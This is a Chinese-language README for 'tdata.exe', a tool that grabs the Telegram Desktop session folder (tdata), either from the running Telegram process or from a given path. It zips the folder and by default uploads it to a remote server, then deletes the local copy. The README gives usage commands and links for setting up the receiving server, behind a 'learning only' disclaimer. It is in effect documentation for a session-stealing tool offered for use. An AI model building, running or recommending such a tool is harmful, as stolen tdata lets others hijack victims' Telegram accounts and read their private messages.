# TDATA

## 免责声明

涉及到的所有技术仅用来学习交流，严禁用于非法用途。否则产生的一切后果自行承担。

## 介绍

可以根据当前运行的tg进程获取tdata文件，也可以指定tdata目录获取文件。并支持远程上传。

**(1)参数**

tdata.exe -h

``` 
SYNOPSIS
        tdata.exe [-pn <ProcessName>] [-sp <SourcePath>] [-dp <DestinationPath>] [-iu <IsUpload>]
```

**(2)参数说明**

```
"-pn", "-PN", "--ProcessName"
如果tg正在运行，可以根据进程名获取tdata文件，默认进程名为Telegram.exe。

"-sp", "-SP", "--SourcePath"
tdata目录源地址

"-dp", "-DP", "--DestinationPath"
生成压缩文件目的地址，默认为tdata.exe运行目录。

"-iu", "-IU", "--IsUpload"
是否上传到服务器，默认上传服务器。上传服务器后会删除本地文件。关闭上传为off则生成在本地。
```

**(3)用法**

1、根据进程名Telegram.exe获取tdata文件。

```
tdata.exe
```

2、根据进程名Telegram888.exe获取tdata文件。

```
tdata.exe -pn Telegram888.exe
```

3、根据进程名Telegram.exe获取tdata文件，生成在本地当前运行的exe路径下。

```
tdata.exe -iu "off"
```

4、根据tdata目录获取文件，并上传服务器

```
tdata.exe -sp "D:\AppSoftware\Telegram Desktop\Telegram1\tdata"
```

5、根据tdata目录获取文件，生成在本地D:\test目录下。

```
tdata.exe -iu "off" -sp "D:\AppSoftware\Telegram Desktop\Telegram1\tdata" -dp "D:\test"
```

## 参考

客户端ip修改：https://blog.csdn.net/challenglistic/article/details/128242047

服务端代码逻辑：https://blog.csdn.net/qigaohua/article/details/102794593

服务端搭建：https://blog.csdn.net/explore_world/article/details/88551349
